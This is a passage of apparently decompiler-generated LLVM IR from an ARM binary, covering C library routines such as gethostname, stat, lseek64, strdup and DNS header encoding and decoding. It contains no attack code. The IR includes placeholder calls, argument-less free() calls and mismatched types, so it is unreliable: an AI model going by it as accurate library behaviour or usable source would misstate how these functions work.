  br i1 %v2_1e440, label %dec_label_pc_1e474, label %dec_label_pc_1e44c

dec_label_pc_1e44c:                               ; preds = %dec_label_pc_1e438
  %v0_1e44c = load i32, i32* @r4, align 4
  %v1_1e44c = inttoptr i32 %v0_1e44c to i8*
  store i32 %v0_1e44c, i32* %r0.global-to-local, align 4
  %v3_1e450 = call i32 @strlen(i8* %v1_1e44c)
  store i32 %v3_1e450, i32* %r0.global-to-local, align 4
  %v0_1e454 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1e454, %v3_1e450
  br i1 %tmp, label %dec_label_pc_1e45c, label %dec_label_pc_1e474

dec_label_pc_1e45c:                               ; preds = %dec_label_pc_1e44c
  %v0_1e45c = load i32, i32* @r4, align 4
  store i32 %v0_1e45c, i32* @r1, align 4
  %v0_1e460 = load i32, i32* @r5, align 4
  store i32 %v0_1e460, i32* %r0.global-to-local, align 4
  %v2_1e464 = inttoptr i32 %v0_1e460 to i8*
  %v3_1e464 = call i32 @strcpy(i8* %v2_1e464, i32 %v0_1e45c)
  store i32 %v3_1e464, i32* %r0.global-to-local, align 4
  %v0_1e468 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e474

dec_label_pc_1e474:                               ; preds = %dec_label_pc_1e44c, %dec_label_pc_1e438, %dec_label_pc_1e45c
  %storemerge1 = phi i32 [ %v0_1e468, %dec_label_pc_1e45c ], [ %v0_1e1f0, %dec_label_pc_1e44c ], [ %v0_1e1f0, %dec_label_pc_1e438 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1e478 = load i32, i32* @r7, align 4
  %v2_1e478 = add i32 %v1_1e478, 8
  %v3_1e478 = inttoptr i32 %v2_1e478 to i32*
  store i32 2, i32* %v3_1e478, align 4
  %v0_1e47c = load i32, i32* %r2.global-to-local, align 4
  %v2_1e47c = mul i32 %v0_1e47c, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e484 = load i32, i32* @r7, align 4
  %v2_1e484 = add i32 %v1_1e484, 12
  %v3_1e484 = inttoptr i32 %v2_1e484 to i32*
  store i32 %v2_1e47c, i32* %v3_1e484, align 4
  %v3_1e488 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e488, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1e490 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1e490, i32* @r5, align 4
  %v0_1e494 = load i32, i32* @r7, align 4
  %v2_1e494 = inttoptr i32 %v3_1e488 to i32*
  store i32 %v0_1e494, i32* %v2_1e494, align 4
  %v0_1e498 = load i32, i32* @r7, align 4
  %v1_1e498 = inttoptr i32 %v0_1e498 to i32*
  %v2_1e498 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1e498, i32* %v1_1e498, align 4
  %v3_1e498 = add i32 %v0_1e498, 4
  %v4_1e498 = inttoptr i32 %v3_1e498 to i32*
  %v5_1e498 = load i32, i32* @fp, align 4
  store i32 %v5_1e498, i32* %v4_1e498, align 4
  %v0_1e49c = load i32, i32* @r6, align 4
  %v1_1e49c = load i32, i32* @r7, align 4
  %v2_1e49c = add i32 %v1_1e49c, 16
  %v3_1e49c = inttoptr i32 %v2_1e49c to i32*
  store i32 %v0_1e49c, i32* %v3_1e49c, align 4
  %v0_1e4a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e4a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e4a0 = inttoptr i32 %v1_1e4a0 to i32*
  store i32 %v0_1e4a0, i32* %v2_1e4a0, align 4
  br label %dec_label_pc_1e4b8

dec_label_pc_1e4a8:                               ; preds = %dec_label_pc_1e3c4
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1e25c, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1e4b8

dec_label_pc_1e4b8:                               ; preds = %bb37, %dec_label_pc_1e474, %dec_label_pc_1e4a8
  %v3_1e4b8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1e4b8, i32* @r0, align 4
  %v0_1e4bc = call i32 @free()
  %v3_1e4c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1e4c0, i32* @r0, align 4
  %v0_1e4c4 = call i32 @free()
  store i32 %v0_1e4c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e4cc:                               ; preds = %dec_label_pc_1e2a4, %dec_label_pc_1e2c8
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e4d0:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1e290, %dec_label_pc_1e270, %dec_label_pc_1e4b8, %dec_label_pc_1e32c, %dec_label_pc_1e4cc
  %v0_1e4d0 = load i32, i32* @r5, align 4
  store i32 %v0_1e4d0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1e4d0

; uselistorder directives
  uselistorder i32 %v0_1e44c, { 1, 0 }
  uselistorder i32 %v1_1e428, { 1, 0, 2 }
  uselistorder i32 %v1_1e424, { 1, 0 }
  uselistorder i32 %v0_1e3f4, { 1, 0, 2 }
  uselistorder i32 %v2_1e3e8, { 1, 0 }
  uselistorder i32 %v1_1e2e8, { 2, 1, 0 }
  uselistorder i32 %v1_1e2dc, { 1, 0 }
  uselistorder i32 %v0_1e2b0, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1e25c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1e1fc, { 1, 0 }
  uselistorder i32 %v0_1e1f0, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 19, 20, 4, 3, 6, 5, 8, 7, 0, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 11, 22, 29, 28, 27, 1, 26, 25, 24, 23, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1e4d0, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1e4cc, { 1, 0 }
  uselistorder label %dec_label_pc_1e4b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e474, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e2a4, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e4e0 = load i32, i32* @r7, align 4
  store i32 %v3_1e4e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e508, label %dec_label_pc_1e4f8

dec_label_pc_1e4f8:                               ; preds = %entry
  %v0_1e4f8 = call i32 @__GI___errno_location()
  %v0_1e4fc = load i32, i32* %r7.global-to-local, align 4
  %v1_1e4fc = sub i32 0, %v0_1e4fc
  %v2_1e500 = inttoptr i32 %v0_1e4f8 to i32*
  store i32 %v1_1e4fc, i32* %v2_1e500, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1e50c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1e508

dec_label_pc_1e508:                               ; preds = %entry, %dec_label_pc_1e4f8
  %v2_1e50c = phi i32 [ %v3_1e4e0, %entry ], [ %v2_1e50c.pre, %dec_label_pc_1e4f8 ]
  %v0_1e508 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1e4f8 ]
  store i32 %v2_1e50c, i32* @r7, align 4
  ret i32 %v0_1e508

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e508, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1e520 = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1e530 = call i32 @uname(i32 %v2_1e520)
  %v7_1e534 = icmp eq i32 %v1_1e530, -1
  br i1 %v7_1e534, label %bb, label %dec_label_pc_1e540

bb:                                               ; preds = %entry
  store i32 %v1_1e530, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e57c

dec_label_pc_1e540:                               ; preds = %entry
  %v2_1e540 = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_1e548 = call i32 @strlen(i8* %tmp10)
  %v1_1e54c = add i32 %v3_1e548, 1
  %v1_1e550 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1e54c, %v1_1e550
  br i1 %tmp, label %dec_label_pc_1e558, label %dec_label_pc_1e56c

dec_label_pc_1e558:                               ; preds = %dec_label_pc_1e540
  %v0_1e558 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1e564 = inttoptr i32 %v0_1e558 to i32*
  store i32 22, i32* %v2_1e564, align 4
  %v0_1e57c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e57c

dec_label_pc_1e56c:                               ; preds = %dec_label_pc_1e540
  %v0_1e56c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1e540, i32* @r1, align 4
  %v2_1e574 = inttoptr i32 %v0_1e56c to i8*
  %v3_1e574 = call i32 @strcpy(i8* %v2_1e574, i32 %v2_1e540)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e57c

dec_label_pc_1e57c:                               ; preds = %bb, %dec_label_pc_1e558, %dec_label_pc_1e56c
  %v0_1e57c = phi i32 [ %v1_1e530, %bb ], [ %v0_1e57c.pre, %dec_label_pc_1e558 ], [ 0, %dec_label_pc_1e56c ]
  ret i32 %v0_1e57c

; uselistorder directives
  uselistorder i32 %v2_1e540, { 1, 0 }
  uselistorder i32 %v1_1e530, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 3, 16, 4, 5, 18, 0, 17, 6, 7, 8, 9, 14, 10, 11, 12, 19, 13, 1, 2, 15 }
  uselistorder label %dec_label_pc_1e57c, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e5c4, label %dec_label_pc_1e5b0

dec_label_pc_1e5b0:                               ; preds = %entry
  %v0_1e5b0 = call i32 @__GI___errno_location()
  %v0_1e5b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e5b4 = sub i32 0, %v0_1e5b4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1e5bc = inttoptr i32 %v0_1e5b0 to i32*
  store i32 %v1_1e5b4, i32* %v2_1e5bc, align 4
  br label %dec_label_pc_1e5d4

dec_label_pc_1e5c4:                               ; preds = %entry
  %v2_1e5c4 = icmp eq i32 %arg1, 0
  br i1 %v2_1e5c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e5c4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e5c4, %bb
  call void @__pseudo_cond_branch(i1 %v2_1e5c4, i32 ptrtoint (i32* @global_var_1c698.1654 to i32))
  br label %dec_label_pc_1e5d4

dec_label_pc_1e5d4:                               ; preds = %dec_label_pc_1e5b0, %.thread
  %v0_1e5d4 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1e5d4

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e5d4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e624, label %dec_label_pc_1e610

dec_label_pc_1e610:                               ; preds = %entry
  %v0_1e610 = call i32 @__GI___errno_location()
  %v0_1e614 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e614 = sub i32 0, %v0_1e614
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1e61c = inttoptr i32 %v0_1e610 to i32*
  store i32 %v1_1e614, i32* %v2_1e61c, align 4
  %v0_1e62c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e62c

dec_label_pc_1e624:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1e624 = icmp eq i32 %arg1, 0
  br i1 %v2_1e624, label %dec_label_pc_1e638, label %dec_label_pc_1e62c

dec_label_pc_1e62c:                               ; preds = %dec_label_pc_1e624, %dec_label_pc_1e610
  %v0_1e62c = phi i32 [ %arg1, %dec_label_pc_1e624 ], [ %v0_1e62c.pre, %dec_label_pc_1e610 ]
  br label %dec_label_pc_1e63c

dec_label_pc_1e638:                               ; preds = %dec_label_pc_1e624
  br label %dec_label_pc_1e63c

dec_label_pc_1e63c:                               ; preds = %dec_label_pc_1e62c, %dec_label_pc_1e638
  %v1_1e644 = phi i32 [ %v0_1e62c, %dec_label_pc_1e62c ], [ %tmp8, %dec_label_pc_1e638 ]
  ret i32 %v1_1e644

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1e63c, { 1, 0 }
}

define i32 @function_1e648(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e648:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1e650 = load i32, i32* @r0, align 4
  %v1_1e650 = load i32, i32* @r1, align 4
  %v2_1e650 = inttoptr i32 %v0_1e650 to i8*
  %v3_1e650 = call i32 @_memcpy(i8* %v2_1e650, i32 %v1_1e650)
  ret i32 %v3_1e650

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1e660 = load i32, i32* @r4, align 4
  store i32 %v3_1e660, i32* %stack_var_-16, align 4
  %v9_1e660 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1e668 = call i32 @strlen(i8* %arg1)
  %v1_1e66c = add i32 %v3_1e668, 1
  store i32 %v1_1e66c, i32* @r4, align 4
  %v1_1e674 = call i32 @malloc(i32 %v1_1e66c)
  store i32 %v1_1e674, i32* %r5.global-to-local, align 4
  %v2_1e678 = icmp eq i32 %v1_1e674, 0
  br i1 %v2_1e678, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1e684 = xor i1 %v2_1e678, true
  call void @__pseudo_cond_branch(i1 %v1_1e684, i32 ptrtoint (i32* @global_var_15a50.1513 to i32))
  %v0_1e688 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e68c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e68c, i32* @r4, align 4
  store i32 %v9_1e660, i32* @r6, align 4
  ret i32 %v0_1e688

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 13, 12, 11, 5, 4, 10, 9, 8, 14, 7, 6, 15, 23, 1, 22, 21, 20, 19, 3, 18, 17, 16, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_1e698 = load i32, i32* @lr, align 4
  store i32 %v0_1e698, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1e6a4 = icmp sgt i32 %arg3, 11
  br i1 %v7_1e6a4, label %dec_label_pc_1e6ac, label %dec_label_pc_1e778

dec_label_pc_1e6ac:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1e6ac = add i32 %tmp, 1
  %v2_1e6ac = inttoptr i32 %v1_1e6ac to i8*
  %v3_1e6ac = load i8, i8* %v2_1e6ac, align 1
  store i8 %v3_1e6ac, i8* %tmp16, align 1
  %v0_1e6b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e6b4 = inttoptr i32 %v0_1e6b4 to i32*
  %v2_1e6b4 = load i32, i32* %v1_1e6b4, align 4
  %v1_1e6b8 = trunc i32 %v2_1e6b4 to i8
  %v4_1e6b8 = add i32 %arg2, 1
  %v5_1e6b8 = inttoptr i32 %v4_1e6b8 to i8*
  store i8 %v1_1e6b8, i8* %v5_1e6b8, align 1
  %v0_1e6bc = load i32, i32* %ip.global-to-local, align 4
  %v1_1e6bc = add i32 %v0_1e6bc, 8
  %v2_1e6bc = inttoptr i32 %v1_1e6bc to i32*
  %v3_1e6bc = load i32, i32* %v2_1e6bc, align 4
  %v1_1e6c0 = add i32 %v0_1e6bc, 20
  %v2_1e6c0 = inttoptr i32 %v1_1e6c0 to i32*
  %v3_1e6c0 = load i32, i32* %v2_1e6c0, align 4
  %v1_1e6c4 = add i32 %v0_1e6bc, 4
  %v2_1e6c4 = inttoptr i32 %v1_1e6c4 to i32*
  %v3_1e6c4 = load i32, i32* %v2_1e6c4, align 4
  %v1_1e6c8 = add i32 %v0_1e6bc, 12
  %v2_1e6c8 = inttoptr i32 %v1_1e6c8 to i32*
  %v3_1e6c8 = load i32, i32* %v2_1e6c8, align 4
  %v2_1e6cc = icmp eq i32 %v3_1e6c0, 0
  br i1 %v2_1e6cc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1e6ac
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1e6ac, %bb
  %v0_1e6dc = phi i32 [ 0, %dec_label_pc_1e6ac ], [ 1, %bb ]
  %v1_1e6d4 = urem i32 %v3_1e6bc, 16
  %v2_1e6d8 = icmp eq i32 %v3_1e6c4, 0
  %v4_1e6dc = mul nuw nsw i32 %v1_1e6d4, 8
  %v5_1e6dc = or i32 %v0_1e6dc, %v4_1e6dc
  %v1_1e6e0 = add i32 %v0_1e6bc, 16
  %v2_1e6e0 = inttoptr i32 %v1_1e6e0 to i32*
  %v3_1e6e0 = load i32, i32* %v2_1e6e0, align 4
  %. = select i1 %v2_1e6d8, i32 0, i32 128
  %v2_1e6ec = icmp eq i32 %v3_1e6c8, 0
  %storemerge11 = select i1 %v2_1e6ec, i32 0, i32 4
  %v2_1e6f8 = or i32 %v5_1e6dc, %.
  %v2_1e6fc = icmp eq i32 %v3_1e6e0, 0
  %.26 = select i1 %v2_1e6fc, i32 0, i32 2
  %v2_1e708 = or i32 %v2_1e6f8, %storemerge11
  %v2_1e70c = or i32 %v2_1e708, %.26
  %v1_1e710 = trunc i32 %v2_1e70c to i8
  %v2_1e710 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e710 = add i32 %v2_1e710, 2
  %v4_1e710 = inttoptr i32 %v3_1e710 to i8*
  store i8 %v1_1e710, i8* %v4_1e710, align 1
  %v0_1e714 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e714 = add i32 %v0_1e714, 24
  %v1_1e718 = inttoptr i32 %v1_1e714 to i32*
  %v2_1e718 = load i32, i32* %v1_1e718, align 4
  %v3_1e718 = add i32 %v0_1e714, 28
  %v4_1e718 = inttoptr i32 %v3_1e718 to i32*
  %v5_1e718 = load i32, i32* %v4_1e718, align 4
  %v2_1e71c = icmp eq i32 %v2_1e718, 0
  %v1_1e720 = urem i32 %v5_1e718, 16
  %v0_1e72c = select i1 %v2_1e71c, i32 0, i32 128
  %v2_1e72c = or i32 %v1_1e720, %v0_1e72c
  %v1_1e730 = trunc i32 %v2_1e72c to i8
  %v2_1e730 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e730 = add i32 %v2_1e730, 3
  %v4_1e730 = inttoptr i32 %v3_1e730 to i8*
  store i8 %v1_1e730, i8* %v4_1e730, align 1
  %v0_1e734 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e734 = add i32 %v0_1e734, 33
  %v2_1e734 = inttoptr i32 %v1_1e734 to i8*
  %v3_1e734 = load i8, i8* %v2_1e734, align 1
  %v2_1e738 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e738 = add i32 %v2_1e738, 4
  %v4_1e738 = inttoptr i32 %v3_1e738 to i8*
  store i8 %v3_1e734, i8* %v4_1e738, align 1
  %v0_1e73c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e73c = add i32 %v0_1e73c, 32
  %v2_1e73c = inttoptr i32 %v1_1e73c to i32*
  %v3_1e73c = load i32, i32* %v2_1e73c, align 4
  %v1_1e740 = trunc i32 %v3_1e73c to i8
  %v2_1e740 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e740 = add i32 %v2_1e740, 5
  %v4_1e740 = inttoptr i32 %v3_1e740 to i8*
  store i8 %v1_1e740, i8* %v4_1e740, align 1
  %v0_1e744 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e744 = add i32 %v0_1e744, 37
  %v2_1e744 = inttoptr i32 %v1_1e744 to i8*
  %v3_1e744 = load i8, i8* %v2_1e744, align 1
  %v2_1e748 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e748 = add i32 %v2_1e748, 6
  %v4_1e748 = inttoptr i32 %v3_1e748 to i8*
  store i8 %v3_1e744, i8* %v4_1e748, align 1
  %v0_1e74c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e74c = add i32 %v0_1e74c, 36
  %v2_1e74c = inttoptr i32 %v1_1e74c to i32*
  %v3_1e74c = load i32, i32* %v2_1e74c, align 4
  %v1_1e750 = trunc i32 %v3_1e74c to i8
  %v2_1e750 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e750 = add i32 %v2_1e750, 7
  %v4_1e750 = inttoptr i32 %v3_1e750 to i8*
  store i8 %v1_1e750, i8* %v4_1e750, align 1
  %v0_1e754 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e754 = add i32 %v0_1e754, 41
  %v2_1e754 = inttoptr i32 %v1_1e754 to i8*
  %v3_1e754 = load i8, i8* %v2_1e754, align 1
  %v2_1e758 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e758 = add i32 %v2_1e758, 8
  %v4_1e758 = inttoptr i32 %v3_1e758 to i8*
  store i8 %v3_1e754, i8* %v4_1e758, align 1
  %v0_1e75c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e75c = add i32 %v0_1e75c, 40
  %v2_1e75c = inttoptr i32 %v1_1e75c to i32*
  %v3_1e75c = load i32, i32* %v2_1e75c, align 4
  %v1_1e760 = trunc i32 %v3_1e75c to i8
  %v2_1e760 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e760 = add i32 %v2_1e760, 9
  %v4_1e760 = inttoptr i32 %v3_1e760 to i8*
  store i8 %v1_1e760, i8* %v4_1e760, align 1
  %v0_1e764 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e764 = add i32 %v0_1e764, 45
  %v2_1e764 = inttoptr i32 %v1_1e764 to i8*
  %v3_1e764 = load i8, i8* %v2_1e764, align 1
  %v2_1e768 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e768 = add i32 %v2_1e768, 10
  %v4_1e768 = inttoptr i32 %v3_1e768 to i8*
  store i8 %v3_1e764, i8* %v4_1e768, align 1
  %v0_1e76c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e76c = add i32 %v0_1e76c, 44
  %v2_1e76c = inttoptr i32 %v1_1e76c to i32*
  %v3_1e76c = load i32, i32* %v2_1e76c, align 4
  %v1_1e770 = trunc i32 %v3_1e76c to i8
  %v2_1e770 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e770 = add i32 %v2_1e770, 11
  %v4_1e770 = inttoptr i32 %v3_1e770 to i8*
  store i8 %v1_1e770, i8* %v4_1e770, align 1
  %v2_1e778.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1e778

dec_label_pc_1e778:                               ; preds = %entry, %bb17
  %v2_1e778 = phi i32 [ %v2_1e778.pre, %bb17 ], [ %v0_1e698, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_1e778, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1e6bc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1e778, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1e780 = load i8, i8* %arg1, align 1
  %v4_1e780 = zext i8 %v3_1e780 to i32
  %v2_1e784 = add i32 %tmp, 1
  %v3_1e784 = inttoptr i32 %v2_1e784 to i8*
  %v4_1e784 = load i8, i8* %v3_1e784, align 1
  %v5_1e784 = zext i8 %v4_1e784 to i32
  %v4_1e788 = mul nuw nsw i32 %v4_1e780, 256
  %v5_1e788 = or i32 %v5_1e784, %v4_1e788
  %v2_1e78c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1e788, i32* %v2_1e78c, align 4
  %v2_1e790 = add i32 %tmp, 2
  %v3_1e790 = inttoptr i32 %v2_1e790 to i8*
  %v4_1e790 = load i8, i8* %v3_1e790, align 1
  %tmp3 = icmp slt i8 %v4_1e790, 0
  %v3_1e794 = zext i1 %tmp3 to i32
  %v2_1e798 = add i32 %arg2, 4
  %v3_1e798 = inttoptr i32 %v2_1e798 to i32*
  store i32 %v3_1e794, i32* %v3_1e798, align 4
  %v4_1e79c = load i8, i8* %v3_1e790, align 1
  %div = udiv i8 %v4_1e79c, 8
  %tmp4 = urem i8 %div, 16
  %v1_1e7a4 = zext i8 %tmp4 to i32
  %v2_1e7a8 = add i32 %arg2, 8
  %v3_1e7a8 = inttoptr i32 %v2_1e7a8 to i32*
  store i32 %v1_1e7a4, i32* %v3_1e7a8, align 4
  %v4_1e7ac = load i8, i8* %v3_1e790, align 1
  %div1 = udiv i8 %v4_1e7ac, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1e7b4 = zext i8 %tmp5 to i32
  %v2_1e7b8 = add i32 %arg2, 12
  %v3_1e7b8 = inttoptr i32 %v2_1e7b8 to i32*
  store i32 %v1_1e7b4, i32* %v3_1e7b8, align 4
  %v4_1e7bc = load i8, i8* %v3_1e790, align 1
  %div2 = udiv i8 %v4_1e7bc, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1e7c4 = zext i8 %tmp6 to i32
  %v2_1e7c8 = add i32 %arg2, 16
  %v3_1e7c8 = inttoptr i32 %v2_1e7c8 to i32*
  store i32 %v1_1e7c4, i32* %v3_1e7c8, align 4
  %v4_1e7cc = load i8, i8* %v3_1e790, align 1
  %tmp7 = urem i8 %v4_1e7cc, 2
  %v1_1e7d0 = zext i8 %tmp7 to i32
  %v2_1e7d4 = add i32 %arg2, 20
  %v3_1e7d4 = inttoptr i32 %v2_1e7d4 to i32*
  store i32 %v1_1e7d0, i32* %v3_1e7d4, align 4
  %v2_1e7d8 = add i32 %tmp, 3
  %v3_1e7d8 = inttoptr i32 %v2_1e7d8 to i8*
  %v4_1e7d8 = load i8, i8* %v3_1e7d8, align 1
  %tmp8 = icmp slt i8 %v4_1e7d8, 0
  %v3_1e7dc = zext i1 %tmp8 to i32
  %v2_1e7e0 = add i32 %arg2, 24
  %v3_1e7e0 = inttoptr i32 %v2_1e7e0 to i32*
  store i32 %v3_1e7dc, i32* %v3_1e7e0, align 4
  %v4_1e7e4 = load i8, i8* %v3_1e7d8, align 1
  %tmp9 = urem i8 %v4_1e7e4, 16
  %v1_1e7e8 = zext i8 %tmp9 to i32
  %v2_1e7ec = add i32 %arg2, 28
  %v3_1e7ec = inttoptr i32 %v2_1e7ec to i32*
  store i32 %v1_1e7e8, i32* %v3_1e7ec, align 4
